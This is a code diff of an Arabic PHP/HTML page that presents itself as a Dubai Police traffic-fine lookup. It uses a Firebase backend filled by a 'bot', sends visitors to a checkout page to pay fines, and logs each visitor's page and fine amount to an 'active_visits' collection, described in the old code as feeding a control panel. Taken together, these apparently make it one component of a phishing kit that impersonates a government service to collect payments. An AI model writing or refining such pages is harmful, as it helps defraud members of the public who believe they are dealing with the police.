@@ -1,5 +1,5 @@
 <?php
-// صفحة عرض النتائج المعدلة - المهندس حسن
+// صفحة عرض النتائج - متوافقة مع البوت الجديد
 ?>
 <!doctype html>
 <html lang="ar" dir="rtl">
@@ -35,45 +35,89 @@
 
     #resultBox { display: none; border-right: 6px solid var(--main-green); text-align: right; }
     .amount-box { font-size: 35px; font-weight: 900; color: var(--main-green); margin: 10px 0; text-align: center; }
-    
-    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+    .status-pill {
+      display: inline-block;
+      padding: 8px 14px;
+      border-radius: 999px;
+      background: #eef8f2;
+      color: var(--main-green);
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    .status-pill.no-fines {
+      background: #eef5ff;
+      color: #1e5ab6;
+    }
+
+    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; gap: 15px; }
     .info-label { color: #666; }
-    .info-value { font-weight: bold; color: #333; }
+    .info-value { font-weight: bold; color: #333; text-align: left; }
+
+    .details-box {
+      margin-top: 16px;
+      background: #f8f8f8;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 13px;
+      line-height: 1.8;
+      color: #555;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
 
     .pay-btn {
       width: 100%; height: 55px; background: var(--main-green); color: #fff;
       border: none; border-radius: 25px; font-size: 18px; font-weight: bold;
       margin-top: 20px; cursor: pointer;
     }
+
+    .back-btn {
+      width: 100%; height: 55px; background: #fff; color: #333;
+      border: 1px solid #ddd; border-radius: 25px; font-size: 18px; font-weight: bold;
+      margin-top: 12px; cursor: pointer;
+    }
   </style>
 </head>
 <body>
 
 <header class="header-fixed">
-  <div class="logo-container"><img src="logo1.png"></div>
+  <div class="logo-container"><img src="logo1.png" alt="Dubai Police"></div>
 </header>
 
 <div class="container">
   <div class="status-card" id="loadingCard">
     <div class="loader-ring"></div>
     <div style="font-weight:bold;">جاري استخراج المخالفات...</div>
-    <p style="font-size:13px; color:#777;">يرجى عدم إغلاق المتصفح، يتم الآن فحص الملف المروري الخاص بك.</p>
+    <p style="font-size:13px; color:#777;">يرجى عدم إغلاق المتصفح، يتم الآن فحص بيانات اللوحة لدى النظام.</p>
   </div>
 
   <div id="resultBox">
+    <div id="statusPill" class="status-pill">تم العثور على نتيجة</div>
     <div style="text-align:center; color:#666; font-size:14px;">إجمالي الغرامات المستحقة</div>
     <div class="amount-box"><span id="totalAmount">0</span> <small style="font-size:15px;">AED</small></div>
-    
+
     <div class="info-row">
       <span class="info-label">رقم اللوحة:</span>
       <span class="info-value" id="plateDisplay">---</span>
     </div>
     <div class="info-row">
+      <span class="info-label">جهة الإصدار:</span>
+      <span class="info-value" id="sourceDisplay">---</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">رمز اللوحة:</span>
+      <span class="info-value" id="codeDisplay">---</span>
+    </div>
+    <div class="info-row">
       <span class="info-label">حالة المخالفات:</span>
-      <span class="info-value" style="color:red;">غير مدفوعة</span>
+      <span class="info-value" id="fineStatusText">---</span>
     </div>
 
-    <button class="pay-btn" onclick="window.location.href='checkout.php'">دفع المخالفات الآن</button>
+    <div class="details-box" id="detailsBox" style="display:none;"></div>
+
+    <button class="pay-btn" id="payBtn" onclick="window.location.href='checkout.php'">متابعة الإجراء</button>
+    <button class="back-btn" onclick="window.location.href='index.php'">استعلام جديد</button>
   </div>
 </div>
 
@@ -89,39 +133,93 @@
       messagingSenderId: "927435762624",
       appId: "1:927435762624:web:11d0bf460b62e4af9db625"
     };
-    
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
     const currentOrderId = sessionStorage.getItem("last_order_id");
 
-    if (!currentOrderId) { window.location.href = "index.php"; }
+    if (!currentOrderId) {
+      window.location.href = "index.php";
+    }
 
-    // مراقبة الطلب لحظياً
+    function mapSource(source) {
+      const labels = {
+        AbuDhabi: "أبوظبي",
+        Dubai: "دبي",
+        Sharjah: "الشارقة",
+        Ajman: "عجمان",
+        "Um Al Quwain": "أم القيوين",
+        RAK: "رأس الخيمة",
+        Fujairah: "الفجيرة",
+        Oman: "عُمان",
+        Qatar: "قطر",
+        Kuwait: "الكويت",
+        Bahrain: "البحرين",
+        KSA: "السعودية"
+      };
+      return labels[source] || source || "---";
+    }
+
+    function renderResult(data) {
+      document.getElementById("loadingCard").style.display = "none";
+      document.getElementById("resultBox").style.display = "block";
+
+      const amount = data.total_fines || "0";
+      const resultStatus = data.result_status || (String(amount) === "0" ? "no_fines" : "has_fines");
+      const plateNumber = data.plate_number || "---";
+      const plateCode = data.plate_code || "---";
+      const plateSource = mapSource(data.plate_source);
+      const resultText = data.result_text || "";
+
+      document.getElementById("totalAmount").innerText = amount;
+      document.getElementById("plateDisplay").innerText = plateNumber;
+      document.getElementById("sourceDisplay").innerText = plateSource;
+      document.getElementById("codeDisplay").innerText = plateCode;
+
+      const statusPill = document.getElementById("statusPill");
+      const fineStatusText = document.getElementById("fineStatusText");
+      const payBtn = document.getElementById("payBtn");
+      const detailsBox = document.getElementById("detailsBox");
+
+      if (resultStatus === "no_fines" || String(amount) === "0") {
+        statusPill.innerText = "لا توجد مخالفات";
+        statusPill.classList.add("no-fines");
+        fineStatusText.innerText = "لا توجد غرامات مستحقة";
+        payBtn.innerText = "العودة للرئيسية";
+        payBtn.onclick = function () { window.location.href = 'index.php'; };
+      } else {
+        statusPill.innerText = "توجد مخالفات";
+        fineStatusText.innerText = "غير مدفوعة";
+        payBtn.innerText = "متابعة الإجراء";
+        payBtn.onclick = function () { window.location.href = 'checkout.php'; };
+      }
+
+      if (resultText) {
+        detailsBox.style.display = "block";
+        detailsBox.innerText = resultText.slice(0, 600);
+      }
+
+      db.collection("active_visits").doc(currentOrderId).set({
+        page: "مشاهدة النتائج",
+        total_fines: amount,
+        last_seen: firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true });
+    }
+
     db.collection("orders").doc(currentOrderId).onSnapshot((doc) => {
-        if (doc.exists) {
-            const data = doc.data();
-            
-            // 1. تحديث رقم اللوحة فوراً
-            if(data.plate_number) {
-                document.getElementById("plateDisplay").innerText = data.plate_number;
-            }
+      if (!doc.exists) {
+        window.location.href = "index.php";
+        return;
+      }
 
-            // 2. التحقق لو البوت حدد مبلغ (بجرب كل المسميات المحتملة)
-            const finalAmount = data.amount || data.total_fines || data.total || null;
+      const data = doc.data();
+      if (data.plate_number) {
+        document.getElementById("plateDisplay").innerText = data.plate_number;
+      }
 
-            if (finalAmount !== null && finalAmount !== "Checking...") {
-                // إظهار النتيجة وإخفاء اللودر
-                document.getElementById("loadingCard").style.display = "none";
-                document.getElementById("resultBox").style.display = "block";
-                document.getElementById("totalAmount").innerText = finalAmount;
-                
-                // تحديث الحالة في لوحة التحكم إن الزبون شاف النتيجة
-                db.collection("active_visits").doc(currentOrderId).set({
-                    page: "مشاهدة النتائج (مبلغ: " + finalAmount + ")",
-                    last_seen: firebase.firestore.FieldValue.serverTimestamp()
-                }, { merge: true });
-            }
-        }
+      if (data.status === "completed" || data.status === "success") {
+        renderResult(data);
+      }
     });
 </script>
 </body>
